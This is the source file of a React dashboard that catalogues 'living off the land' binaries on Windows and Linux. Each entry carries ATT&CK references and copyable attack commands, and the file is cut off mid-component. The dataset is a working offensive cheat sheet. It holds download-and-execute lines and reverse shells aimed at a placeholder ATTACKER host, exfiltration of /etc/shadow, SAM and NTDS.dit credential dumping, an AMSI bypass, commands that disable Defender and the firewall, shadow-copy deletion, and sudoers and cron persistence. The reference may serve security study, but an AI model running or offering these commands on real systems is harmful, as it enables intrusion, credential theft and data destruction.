import { useState, useMemo } from 'react';
import {
  Box, Flex, Text, Heading, Input, InputGroup, InputLeftElement,
  InputRightElement, IconButton, SimpleGrid, Tag, TagLabel, Tooltip,
} from '@chakra-ui/react';
import { SearchIcon, CloseIcon, CopyIcon, CheckIcon } from '@chakra-ui/icons';
import { motion, AnimatePresence } from 'framer-motion';

const MotionBox = motion(Box);

// ── Colors ────────────────────────────────────────────────────────────────────
const ACCENT  = '#9F7AEA';
const GREEN   = '#68D391';
const RED     = '#FC8181';
const ORANGE  = '#F6AD55';
const BLUE    = '#63B3ED';
const YELLOW  = '#ECC94B';
const CYAN    = '#76E4F7';
const PINK    = '#F687B3';

const OS_COLORS = {
  Windows: BLUE,
  Linux:   GREEN,
  macOS:   '#D1D5DB',
  Any:     ACCENT,
};

const TACTIC_COLORS = {
  'Execution':          RED,
  'Persistence':        ORANGE,
  'Privilege Escalation': YELLOW,
  'Defense Evasion':    ACCENT,
  'Credential Access':  PINK,
  'Discovery':          CYAN,
  'Lateral Movement':   '#4FD1C5',
  'Collection':         BLUE,
  'Exfiltration':       GREEN,
  'C2':                 '#F687B3',
};

// ── Dataset ───────────────────────────────────────────────────────────────────
const LOLBINS = [
  // ── Windows ──
  {
    name: 'certutil.exe', os: 'Windows',
    tactics: ['Defense Evasion', 'Execution'],
    risk: 'High',
    desc: 'Built-in certificate utility. Abused to download files, decode base64, and bypass application whitelisting.',
    commands: [
      { label: 'Download file', cmd: 'certutil.exe -urlcache -split -f http://ATTACKER/file.exe C:\\Windows\\Temp\\file.exe' },
      { label: 'Decode base64', cmd: 'certutil.exe -decode encoded.b64 output.exe' },
      { label: 'Encode file',   cmd: 'certutil.exe -encode input.exe encoded.b64' },
    ],
    refs: 'T1105, T1140',
  },
  {
    name: 'mshta.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'Critical',
    desc: 'Microsoft HTML Application host. Executes HTA files locally or from remote URLs, bypasses many controls.',
    commands: [
      { label: 'Execute remote HTA', cmd: 'mshta.exe http://ATTACKER/payload.hta' },
      { label: 'Execute VBScript',   cmd: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c calc"":close")' },
      { label: 'Execute JS',         cmd: 'mshta.exe javascript:a=(GetObject("script:http://ATTACKER/payload.sct")).exec();close();' },
    ],
    refs: 'T1218.005',
  },
  {
    name: 'regsvr32.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'Critical',
    desc: 'Registers/unregisters OLE controls. Can execute remote scriptlets (SCT files) bypassing AppLocker.',
    commands: [
      { label: 'Execute remote SCT (Squiblydoo)', cmd: 'regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll' },
      { label: 'Execute local DLL',               cmd: 'regsvr32.exe /s payload.dll' },
    ],
    refs: 'T1218.010',
  },
  {
    name: 'rundll32.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'Critical',
    desc: 'Loads and runs 32-bit DLLs. Commonly abused to execute malicious DLLs or built-in Windows functions.',
    commands: [
      { label: 'Execute DLL export',      cmd: 'rundll32.exe payload.dll,EntryPoint' },
      { label: 'Execute JS via mshtml',   cmd: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ATTACKER/p.sct")' },
      { label: 'Execute via advpack',     cmd: 'rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall_SingleUser,1,' },
    ],
    refs: 'T1218.011',
  },
  {
    name: 'powershell.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion', 'C2'],
    risk: 'Critical',
    desc: 'Powerful scripting engine. Execution policies easily bypassed. Heavily used for post-exploitation.',
    commands: [
      { label: 'Bypass execution policy',    cmd: 'powershell.exe -ExecutionPolicy Bypass -File payload.ps1' },
      { label: 'Encoded command',            cmd: 'powershell.exe -EncodedCommand <base64>' },
      { label: 'Download + execute',         cmd: 'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER/payload.ps1\')"' },
      { label: 'Disable AMSI (memory)',      cmd: 'powershell.exe -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)"' },
      { label: 'Hidden window + no profile', cmd: 'powershell.exe -w hidden -nop -noni -c <cmd>' },
    ],
    refs: 'T1059.001',
  },
  {
    name: 'wscript.exe / cscript.exe', os: 'Windows',
    tactics: ['Execution'],
    risk: 'High',
    desc: 'Windows Script Host — executes VBScript and JScript files. Often used to run malicious .vbs/.js droppers.',
    commands: [
      { label: 'Run VBScript',    cmd: 'wscript.exe payload.vbs' },
      { label: 'Run JScript',     cmd: 'cscript.exe payload.js' },
      { label: 'Run silently',    cmd: 'wscript.exe //B //NoLogo payload.vbs' },
    ],
    refs: 'T1059.005, T1059.007',
  },
  {
    name: 'msiexec.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'High',
    desc: 'Windows Installer. Can install packages from remote URLs and execute DLLs.',
    commands: [
      { label: 'Install remote MSI',   cmd: 'msiexec.exe /q /i http://ATTACKER/payload.msi' },
      { label: 'Execute DLL via MSI',  cmd: 'msiexec.exe /y payload.dll' },
      { label: 'Quiet install local',  cmd: 'msiexec.exe /q /i payload.msi' },
    ],
    refs: 'T1218.007',
  },
  {
    name: 'wmic.exe', os: 'Windows',
    tactics: ['Execution', 'Lateral Movement', 'Discovery'],
    risk: 'High',
    desc: 'WMI command-line interface. Used for remote execution, process creation, and system enumeration.',
    commands: [
      { label: 'Remote process create', cmd: 'wmic /node:TARGET process call create "cmd.exe /c payload.exe"' },
      { label: 'Local process create',  cmd: 'wmic process call create "calc.exe"' },
      { label: 'List processes',        cmd: 'wmic process list brief' },
      { label: 'Execute XSL (WMIC)',    cmd: 'wmic process list /FORMAT:http://ATTACKER/payload.xsl' },
    ],
    refs: 'T1047, T1218.003',
  },
  {
    name: 'bitsadmin.exe', os: 'Windows',
    tactics: ['Defense Evasion', 'Execution', 'Persistence'],
    risk: 'High',
    desc: 'Background Intelligent Transfer Service admin tool. Downloads files and can persist via BITS jobs.',
    commands: [
      { label: 'Download file', cmd: 'bitsadmin /transfer job /download /priority high http://ATTACKER/file.exe C:\\Temp\\file.exe' },
      { label: 'Persist via BITS',   cmd: 'bitsadmin /create job && bitsadmin /addfile job http://ATTACKER/payload.exe C:\\Temp\\p.exe && bitsadmin /SetNotifyCmdLine job C:\\Temp\\p.exe NULL && bitsadmin /resume job' },
    ],
    refs: 'T1197',
  },
  {
    name: 'regsvcs.exe / regasm.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'High',
    desc: '.NET component services tools. Execute code in .NET assemblies, bypass AppLocker.',
    commands: [
      { label: 'Execute .NET DLL (regsvcs)', cmd: 'regsvcs.exe payload.dll' },
      { label: 'Execute .NET DLL (regasm)',  cmd: 'regasm.exe /u payload.dll' },
    ],
    refs: 'T1218.009',
  },
  {
    name: 'installutil.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'High',
    desc: '.NET installation utility. Executes code via [RunInstaller] class, bypasses AppLocker and SRP.',
    commands: [
      { label: 'Execute .NET assembly', cmd: 'installutil.exe /logfile= /LogToConsole=false /U payload.exe' },
    ],
    refs: 'T1218.004',
  },
  {
    name: 'odbcconf.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'Medium',
    desc: 'ODBC configuration tool. Can load and execute a DLL via REGSVR action.',
    commands: [
      { label: 'Execute DLL', cmd: 'odbcconf.exe /a {REGSVR payload.dll}' },
      { label: 'Execute remote RSP', cmd: 'odbcconf.exe /S /A {REGSVR "C:\\Temp\\payload.dll"}' },
    ],
    refs: 'T1218.008',
  },
  {
    name: 'cmstp.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion', 'Privilege Escalation'],
    risk: 'High',
    desc: 'Microsoft Connection Manager Profile Installer. Executes INF files, bypasses UAC and AppLocker.',
    commands: [
      { label: 'Execute remote INF + bypass UAC', cmd: 'cmstp.exe /ni /s http://ATTACKER/payload.inf' },
      { label: 'Execute local INF',               cmd: 'cmstp.exe /ni /s payload.inf' },
    ],
    refs: 'T1218.003',
  },
  {
    name: 'msbuild.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'High',
    desc: 'Microsoft Build Engine. Executes inline C# or VB.NET tasks from XML project files, bypasses AppLocker.',
    commands: [
      { label: 'Execute inline task', cmd: 'msbuild.exe payload.csproj' },
    ],
    refs: 'T1127.001',
  },
  {
    name: 'netsh.exe', os: 'Windows',
    tactics: ['Defense Evasion', 'Persistence', 'Lateral Movement'],
    risk: 'High',
    desc: 'Network shell utility. Used to add persistent DLL helpers, configure port forwarding and proxies.',
    commands: [
      { label: 'Port proxy / pivot',   cmd: 'netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=TARGET' },
      { label: 'Persist DLL helper',   cmd: 'netsh add helper C:\\Temp\\payload.dll' },
      { label: 'Disable firewall',     cmd: 'netsh advfirewall set allprofiles state off' },
    ],
    refs: 'T1090, T1546.007',
  },
  {
    name: 'schtasks.exe', os: 'Windows',
    tactics: ['Persistence', 'Execution', 'Privilege Escalation'],
    risk: 'High',
    desc: 'Scheduled task manager. Creates persistent tasks locally or on remote systems.',
    commands: [
      { label: 'Create persistence task', cmd: 'schtasks /create /tn "Updater" /tr "C:\\Temp\\payload.exe" /sc onlogon /ru System' },
      { label: 'Remote task creation',    cmd: 'schtasks /create /s TARGET /u DOMAIN\\user /p pass /tn "job" /tr "cmd /c payload.exe" /sc once /st 00:00' },
      { label: 'Run task now',            cmd: 'schtasks /run /tn "Updater"' },
    ],
    refs: 'T1053.005',
  },
  {
    name: 'sc.exe', os: 'Windows',
    tactics: ['Persistence', 'Privilege Escalation', 'Lateral Movement'],
    risk: 'High',
    desc: 'Service control manager. Creates, starts, stops services locally or remotely for persistence and lateral movement.',
    commands: [
      { label: 'Create malicious service', cmd: 'sc.exe create EvilSvc binPath= "C:\\Temp\\payload.exe" start= auto' },
      { label: 'Remote service create',    cmd: 'sc.exe \\\\TARGET create EvilSvc binPath= "cmd /c payload.exe"' },
      { label: 'Start service',            cmd: 'sc.exe start EvilSvc' },
    ],
    refs: 'T1543.003',
  },
  {
    name: 'reg.exe', os: 'Windows',
    tactics: ['Persistence', 'Defense Evasion', 'Credential Access'],
    risk: 'High',
    desc: 'Registry editor CLI. Read/write registry keys, dump SAM/SYSTEM hives for offline credential extraction.',
    commands: [
      { label: 'Dump SAM hive',     cmd: 'reg save HKLM\\SAM C:\\Temp\\sam.hive' },
      { label: 'Dump SYSTEM hive',  cmd: 'reg save HKLM\\SYSTEM C:\\Temp\\system.hive' },
      { label: 'Add run key',       cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d "C:\\Temp\\payload.exe" /f' },
      { label: 'Disable Defender',  cmd: 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f' },
    ],
    refs: 'T1003.002, T1547.001',
  },
  {
    name: 'ieexec.exe', os: 'Windows',
    tactics: ['Execution'],
    risk: 'Medium',
    desc: 'Internet Explorer executable application host. Downloads and executes remote .NET applications.',
    commands: [
      { label: 'Execute remote .NET app', cmd: 'ieexec.exe http://ATTACKER/payload.exe' },
    ],
    refs: 'T1218',
  },
  {
    name: 'expand.exe', os: 'Windows',
    tactics: ['Defense Evasion'],
    risk: 'Low',
    desc: 'Expands compressed cabinet files. Can copy or move files to alternate locations.',
    commands: [
      { label: 'Copy file', cmd: 'expand \\\\ATTACKER\\share\\payload.exe C:\\Temp\\payload.exe' },
    ],
    refs: 'T1218',
  },
  {
    name: 'diskshadow.exe', os: 'Windows',
    tactics: ['Defense Evasion', 'Credential Access'],
    risk: 'High',
    desc: 'Volume Shadow Copy admin tool. Executes scripts and can access NTDS.dit via VSS for offline extraction.',
    commands: [
      { label: 'Execute script',         cmd: 'diskshadow.exe /s payload.txt' },
      { label: 'Shadow copy + NTDS',     cmd: 'diskshadow> set context persistent nowriters\nadd volume c: alias shadow1\ncreate\nexpose %shadow1% z:' },
    ],
    refs: 'T1003.003, T1218',
  },
  {
    name: 'ntdsutil.exe', os: 'Windows',
    tactics: ['Credential Access'],
    risk: 'Critical',
    desc: 'NTDS database utility. Creates IFM snapshots containing the full NTDS.dit and SYSTEM hive offline.',
    commands: [
      { label: 'Create IFM snapshot (dump NTDS)', cmd: 'ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\dump" q q' },
    ],
    refs: 'T1003.003',
  },
  {
    name: 'esentutl.exe', os: 'Windows',
    tactics: ['Credential Access', 'Defense Evasion'],
    risk: 'High',
    desc: 'ESE database utility. Copies locked files (including NTDS.dit, Vault, browser DBs) using VSS.',
    commands: [
      { label: 'Copy locked NTDS.dit', cmd: 'esentutl.exe /y "C:\\Windows\\NTDS\\ntds.dit" /d "C:\\Temp\\ntds.dit" /o' },
      { label: 'Download file (HTTP)', cmd: 'esentutl.exe /y /vss "http://ATTACKER/file" /d C:\\Temp\\file' },
    ],
    refs: 'T1003.003',
  },
  {
    name: 'vssadmin.exe', os: 'Windows',
    tactics: ['Credential Access', 'Defense Evasion'],
    risk: 'High',
    desc: 'Volume Shadow Copy admin. Creates/deletes shadow copies. Ransomware deletes them; red teams use them to access NTDS.dit.',
    commands: [
      { label: 'List shadow copies',  cmd: 'vssadmin list shadows' },
      { label: 'Create shadow copy',  cmd: 'vssadmin create shadow /for=C:' },
      { label: 'Delete all shadows',  cmd: 'vssadmin delete shadows /all /quiet' },
    ],
    refs: 'T1490, T1003.003',
  },
  {
    name: 'xcopy.exe / robocopy.exe', os: 'Windows',
    tactics: ['Collection', 'Exfiltration'],
    risk: 'Medium',
    desc: 'Built-in file copy tools. Used to stage and collect files of interest before exfiltration.',
    commands: [
      { label: 'Copy files by extension', cmd: 'xcopy /s /e C:\\Users\\*.docx C:\\Temp\\staged\\' },
      { label: 'Mirror to share',         cmd: 'robocopy C:\\Sensitive \\\\ATTACKER\\share /E /COPYALL' },
    ],
    refs: 'T1005, T1039',
  },
  {
    name: 'forfiles.exe', os: 'Windows',
    tactics: ['Execution'],
    risk: 'Medium',
    desc: 'Batch file processor. Executes commands per-file. Abused to spawn payloads while evading simple command-line detection.',
    commands: [
      { label: 'Execute via forfiles', cmd: 'forfiles /p C:\\Windows\\System32 /m notepad.exe /c "C:\\Temp\\payload.exe"' },
    ],
    refs: 'T1218',
  },
  {
    name: 'pcalua.exe', os: 'Windows',
    tactics: ['Execution', 'Defense Evasion'],
    risk: 'Medium',
    desc: 'Program Compatibility Assistant. Executes programs as a child of a trusted Windows process.',
    commands: [
      { label: 'Execute payload', cmd: 'pcalua.exe -a C:\\Temp\\payload.exe' },
      { label: 'Execute via URL', cmd: 'pcalua.exe -a http://ATTACKER/payload.exe' },
    ],
    refs: 'T1218',
  },
  {
    name: 'dnscmd.exe', os: 'Windows',
    tactics: ['Persistence'],
    risk: 'High',
    desc: 'DNS server management CLI. Loads arbitrary DLLs as DNS plugins when run on Domain Controllers.',
    commands: [
      { label: 'Load DLL plugin on DC', cmd: 'dnscmd.exe DC01 /config /serverlevelplugindll \\\\ATTACKER\\share\\payload.dll' },
    ],
    refs: 'T1574.002',
  },
  // ── Linux / macOS ──
  {
    name: 'curl / wget', os: 'Linux',
    tactics: ['Execution', 'Exfiltration', 'C2'],
    risk: 'High',
    desc: 'HTTP clients available on nearly every Linux system. Download payloads, exfiltrate files, and proxy C2 traffic.',
    commands: [
      { label: 'Download + execute',   cmd: 'curl -s http://ATTACKER/payload.sh | bash' },
      { label: 'Exfil file via POST',  cmd: 'curl -F "file=@/etc/shadow" http://ATTACKER/upload' },
      { label: 'Reverse shell via curl', cmd: 'curl http://ATTACKER/shell.sh -o /tmp/s && chmod +x /tmp/s && /tmp/s' },
    ],
    refs: 'T1105, T1048',
  },
  {
    name: 'bash / sh', os: 'Linux',
    tactics: ['Execution', 'C2'],
    risk: 'Critical',
    desc: 'Shell interpreters. Reverse shells, payload execution, and C2 via /dev/tcp without extra tools.',
    commands: [
      { label: 'Bash reverse shell',    cmd: 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' },
      { label: 'Read file via /dev/tcp', cmd: 'cat /etc/shadow > /dev/tcp/ATTACKER/4444' },
      { label: 'Encoded payload exec',  cmd: 'echo <base64> | base64 -d | bash' },
    ],
    refs: 'T1059.004',
  },
  {
    name: 'python / python3', os: 'Any',
    tactics: ['Execution', 'C2', 'Exfiltration'],
    risk: 'Critical',
    desc: 'Scripting runtime present on most systems. Used for reverse shells, HTTP servers, and quick exploitation.',
    commands: [
      { label: 'Reverse shell',        cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'' },
      { label: 'Serve files via HTTP', cmd: 'python3 -m http.server 8080' },
      { label: 'Execute base64 code',  cmd: 'python3 -c "exec(__import__(\'base64\').b64decode(\'<base64>\'))"' },
    ],
    refs: 'T1059.006',
  },
  {
    name: 'perl', os: 'Linux',
    tactics: ['Execution', 'C2'],
    risk: 'High',
    desc: 'Scripting language present on most Unix systems. Used for reverse shells and quick one-liners.',
    commands: [
      { label: 'Reverse shell', cmd: 'perl -e \'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'' },
    ],
    refs: 'T1059',
  },
  {
    name: 'nc / ncat / netcat', os: 'Linux',
    tactics: ['Execution', 'C2', 'Exfiltration'],
    risk: 'Critical',
    desc: 'Network utility for reading/writing raw TCP/UDP. Classic reverse shell tool and file transfer mechanism.',
    commands: [
      { label: 'Reverse shell (attacker listens)', cmd: 'nc -e /bin/sh ATTACKER 4444' },
      { label: 'Listener on attacker',             cmd: 'nc -lvnp 4444' },
      { label: 'File transfer (send)',              cmd: 'nc -w 3 ATTACKER 4444 < /etc/shadow' },
    ],
    refs: 'T1059, T1048',
  },
  {
    name: 'socat', os: 'Linux',
    tactics: ['C2', 'Lateral Movement'],
    risk: 'High',
    desc: 'Multipurpose relay tool. Creates fully interactive reverse shells and port-forwards through victims.',
    commands: [
      { label: 'Stable reverse shell (attacker)', cmd: 'socat file:`tty`,raw,echo=0 tcp-listen:4444' },
      { label: 'Stable reverse shell (victim)',   cmd: 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444' },
      { label: 'Port forward pivot',              cmd: 'socat tcp-listen:8080,fork tcp:TARGET:80' },
    ],
    refs: 'T1090',
  },
  {
    name: 'ssh', os: 'Linux',
    tactics: ['Lateral Movement', 'C2', 'Exfiltration'],
    risk: 'High',
    desc: 'Secure Shell. Used for lateral movement, dynamic SOCKS proxies, port forwarding, and encrypted file transfer.',
    commands: [
      { label: 'Dynamic SOCKS proxy',      cmd: 'ssh -D 1080 -N user@TARGET' },
      { label: 'Remote port forward',      cmd: 'ssh -R 4444:localhost:4444 user@ATTACKER' },
      { label: 'Local port forward',       cmd: 'ssh -L 8080:TARGET:80 user@JUMPHOST' },
      { label: 'Exfil file via SCP',       cmd: 'scp /etc/shadow user@ATTACKER:/tmp/' },
    ],
    refs: 'T1021.004, T1090.002',
  },
  {
    name: 'cron / crontab', os: 'Linux',
    tactics: ['Persistence'],
    risk: 'High',
    desc: 'Job scheduler. Used to establish persistent execution at regular intervals.',
    commands: [
      { label: 'Add cron job (user)',   cmd: '(crontab -l 2>/dev/null; echo "* * * * * /tmp/payload.sh") | crontab -' },
      { label: 'System-wide cron',     cmd: 'echo "* * * * * root /tmp/payload.sh" >> /etc/cron.d/updater' },
    ],
    refs: 'T1053.003',
  },
  {
    name: 'awk', os: 'Linux',
    tactics: ['Execution'],
    risk: 'Medium',
    desc: 'Text processing utility present everywhere. Executes shell commands, useful for filter-free reverse shells.',
    commands: [
      { label: 'Execute command', cmd: 'awk \'BEGIN {cmd="bash -i >& /dev/tcp/ATTACKER/4444 0>&1"; system(cmd)}\'' },
    ],
    refs: 'T1059',
  },
  {
    name: 'find', os: 'Linux',
    tactics: ['Execution', 'Discovery'],
    risk: 'Medium',
    desc: 'File search utility. Used for discovery and executing commands via -exec without a shell script.',
    commands: [
      { label: 'Execute command via find', cmd: 'find / -name "*.conf" -exec cat {} \\;' },
      { label: 'SUID binary discovery',   cmd: 'find / -perm -u=s -type f 2>/dev/null' },
      { label: 'World-writable files',    cmd: 'find / -perm -o+w -type f 2>/dev/null' },
    ],
    refs: 'T1083, T1548.001',
  },
  {
    name: 'tee', os: 'Linux',
    tactics: ['Privilege Escalation', 'Persistence'],
    risk: 'Medium',
    desc: 'File writing utility. When run via sudo, writes to privileged locations.',
    commands: [
      { label: 'Write to /etc/sudoers via sudo tee', cmd: 'echo "user ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers' },
      { label: 'Overwrite root cron',                cmd: 'echo "* * * * * root bash -i >&/dev/tcp/ATTACKER/4444 0>&1" | sudo tee /etc/cron.d/shell' },
    ],
    refs: 'T1548',
  },
  {
    name: 'openssl', os: 'Linux',
    tactics: ['C2', 'Exfiltration'],
    risk: 'High',
    desc: 'Cryptography toolkit. Creates encrypted reverse shells that bypass plain-text network inspection.',
    commands: [
      { label: 'Encrypted listener (attacker)', cmd: 'openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=ATTACKER"\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444' },
      { label: 'Encrypted shell (victim)',       cmd: 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:4444 > /tmp/s; rm /tmp/s' },
    ],
    refs: 'T1573',
  },
  {
    name: 'dd', os: 'Linux',
    tactics: ['Collection', 'Exfiltration'],
    risk: 'High',
    desc: 'Low-level file/disk copy. Reads raw disk images and locked files, streams content over network.',
    commands: [
      { label: 'Stream disk over network', cmd: 'dd if=/dev/sda | nc -w 3 ATTACKER 4444' },
      { label: 'Copy raw disk image',      cmd: 'dd if=/dev/sda of=/tmp/disk.img bs=4M' },
    ],
    refs: 'T1006',
  },
];

// ── Helpers ───────────────────────────────────────────────────────────────────
const RISK_COLORS = { Critical: RED, High: ORANGE, Medium: YELLOW, Low: GREEN };
const ALL_OS      = ['All', 'Windows', 'Linux', 'Any'];
const ALL_TACTICS = ['All', ...Object.keys(TACTIC_COLORS)];
const ALL_RISKS   = ['All', 'Critical', 'High', 'Medium', 'Low'];

// ── CopyBtn ───────────────────────────────────────────────────────────────────
const CopyBtn = ({ value }) => {
  const [ok, setOk] = useState(false);
  const copy = () => { navigator.clipboard.writeText(value).then(() => { setOk(true); setTimeout(() => setOk(false), 1800); }); };
  return (
    <Tooltip label={ok ? 'Copied!' : 'Copy'} fontSize="10px">
      <IconButton icon={ok ? <CheckIcon boxSize={2.5} /> : <CopyIcon boxSize={2.5} />}
        size="xs" variant="ghost" borderRadius="5px"
        color={ok ? GREEN : 'var(--dash-text-muted)'}
        _hover={{ color: ok ? GREEN : 'white', bg: 'rgba(255,255,255,0.06)' }}
        aria-label="copy" onClick={copy} flexShrink={0} />
    </Tooltip>
  );
};

// ── LOLBin card ───────────────────────────────────────────────────────────────
const LolCard = ({ entry }) => {
  const [open, setOpen] = useState(false);
  const osColor   = OS_COLORS[entry.os]    || ACCENT;
  const riskColor = RISK_COLORS[entry.risk] || YELLOW;

  return (
    <MotionBox
      layout
      initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, scale: 0.97 }} transition={{ duration: 0.18 }}
      borderRadius="12px" overflow="hidden"
      bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
      _hover={{ borderColor: `${osColor}35` }}
      style={{ transition: 'border-color 0.15s' }}
      pos="relative">

      {/* Top gradient line */}
      <Box pos="absolute" top={0} left={0} right={0} h="2px"
        style={{ background: `linear-gradient(to right, transparent, ${osColor}80, transparent)` }} />

      {/* Header */}
      <Flex align="flex-start" justify="space-between" gap={3} px={4} pt={4} pb={3}>
        <Box flex={1} minW={0}>
          <Flex align="center" gap={2} mb={1.5} flexWrap="wrap">
            <Text fontSize="13px" fontWeight="bold" color="var(--dash-text-primary)"
              fontFamily="'Fira Code', monospace">{entry.name}</Text>
            {/* OS tag */}
            <Box px={2} py="2px" borderRadius="5px" fontSize="9px" fontWeight="bold"
              bg={`${osColor}15`} border={`1px solid ${osColor}35`} color={osColor}
              textTransform="uppercase" letterSpacing="wide">{entry.os}</Box>
            {/* Risk tag */}
            <Box px={2} py="2px" borderRadius="5px" fontSize="9px" fontWeight="bold"
              bg={`${riskColor}15`} border={`1px solid ${riskColor}35`} color={riskColor}>
              {entry.risk}
            </Box>
          </Flex>
          <Text fontSize="11px" color="var(--dash-text-muted)" lineHeight={1.5} noOfLines={open ? undefined : 2}>
            {entry.desc}
          </Text>
        </Box>
      </Flex>

      {/* Tactics */}
      <Flex gap={1.5} px={4} pb={3} flexWrap="wrap">
        {entry.tactics.map(t => (
          <Box key={t} px={2} py="2px" borderRadius="5px" fontSize="9px" fontWeight="semibold"
            bg={`${TACTIC_COLORS[t] || ACCENT}12`}
            border={`1px solid ${TACTIC_COLORS[t] || ACCENT}30`}
            color={TACTIC_COLORS[t] || ACCENT}>
            {t}
          </Box>
        ))}
        <Box px={2} py="2px" borderRadius="5px" fontSize="9px" fontWeight="semibold"
          bg="rgba(255,255,255,0.05)" border="1px solid rgba(255,255,255,0.1)"
          color="var(--dash-text-muted)" fontFamily="monospace">
          {entry.refs}
        </Box>
      </Flex>

      {/* Commands — collapsible */}
      <Box
        as="button" w="100%" textAlign="left"
        px={4} py={2} borderTop="1px solid rgba(255,255,255,0.06)"
        color="var(--dash-text-muted)" fontSize="10px" fontWeight="semibold"
        textTransform="uppercase" letterSpacing="wide"
        _hover={{ color: osColor, bg: `${osColor}08` }}
        style={{ transition: 'all 0.12s' }}
        onClick={() => setOpen(p => !p)}>
        <Flex align="center" justify="space-between">
          <Text>{entry.commands.length} command{entry.commands.length !== 1 ? 's' : ''}</Text>
          <Text>{open ? '▲' : '▼'}</Text>
        </Flex>
      </Box>

      <AnimatePresence>
        {open && (
          <MotionBox
            initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.18 }}
            overflow="hidden">
            <Box px={4} pb={4} pt={2}>
              {entry.commands.map((c, i) => (
                <Box key={i} mb={i < entry.commands.length - 1 ? 3 : 0}>
                  <Text fontSize="9px" fontWeight="bold" color="var(--dash-text-muted)"
                    textTransform="uppercase" letterSpacing="wide" mb={1}>{c.label}</Text>
                  <Flex align="flex-start" gap={2}
                    bg="rgba(0,0,0,0.3)" borderRadius="8px" px={3} py={2.5}
                    border="1px solid rgba(255,255,255,0.06)">
                    <Text fontSize="11px" fontFamily="'Fira Code', monospace"
                      color={osColor} flex={1} wordBreak="break-all" whiteSpace="pre-wrap">
                      {c.cmd}
                    </Text>
                    <CopyBtn value={c.cmd} />
                  </Flex>
                </Box>
              ))}
            </Box>
          </MotionBox>
        )}
      </AnimatePresence>
    </MotionBox>
  );
};

// ── Stat card ─────────────────────────────────────────────────────────────────
const StatCard = ({ label, value, color }) => (
  <Box px={4} py={3} borderRadius="12px" bg="var(--dash-card-bg)"
    border="1px solid var(--dash-card-border)" pos="relative" overflow="hidden">
    <Box pos="absolute" top={0} left={0} right={0} h="2px"
      style={{ background: `linear-gradient(to right, transparent, ${color}80, transparent)` }} />
    <Text fontSize="22px" fontWeight="bold" color={color} lineHeight={1}>{value}</Text>
    <Text fontSize="11px" color="var(--dash-text-muted)" mt={1}>{label}</Text>
  </Box>
);

// ── Filter pill ───────────────────────────────────────────────────────────────
const FilterPill = ({ label, active, color, onClick }) => (
  <Box as="button" px={3} py={1.5} borderRadius="20px" fontSize="11px" fontWeight="semibold"
    bg={active ? `${color}18` : 'rgba(255,255,255,0.04)'}
    border={`1px solid ${active ? color + '50' : 'rgba(255,255,255,0.08)'}`}
    color={active ? color : 'var(--dash-text-muted)'}
    _hover={{ color, borderColor: `${color}40` }}
    style={{ transition: 'all 0.12s', whiteSpace: 'nowrap' }}
    onClick={onClick}>
    {label}
  </Box>
);

// ── Main view ─────────────────────────────────────────────────────────────────
const LolbinView = () => {
  const [search,      setSearch]      = useState('');
  const [filterOS,    setFilterOS]    = useState('All');
  const [filterTactic,setFilterTactic]= useState('All');
  const [filterRisk,  setFilterRisk]  = useState('All');

  const filtered = useMemo(() => {
    const q = search.trim().toLowerCase();
    return LOLBINS.filter(e => {
      if (filterOS     !== 'All' && e.os !== filterOS)                            return false;
      if (filterTactic !== 'All' && !e.tactics.includes(filterTactic))            return false;
      if (filterRisk   !== 'All' && e.risk !== filterRisk)                        return false;
      if (q && !e.name.toLowerCase().includes(q) &&
               !e.desc.toLowerCase().includes(q) &&
               !e.refs.toLowerCase().includes(q) &&
               !e.tactics.some(t => t.toLowerCase().includes(q)) &&
               !e.commands.some(c => c.cmd.toLowerCase().includes(q) || c.label.toLowerCase().includes(q)))
        return false;
      return true;
    });
  }, [search, filterOS, filterTactic, filterRisk]);

  return (
    <Box pb={12}>

      {/* ── Header ── */}
      <Flex justify="space-between" align="flex-start" mb={5} flexWrap="wrap" gap={3}>
        <Box>
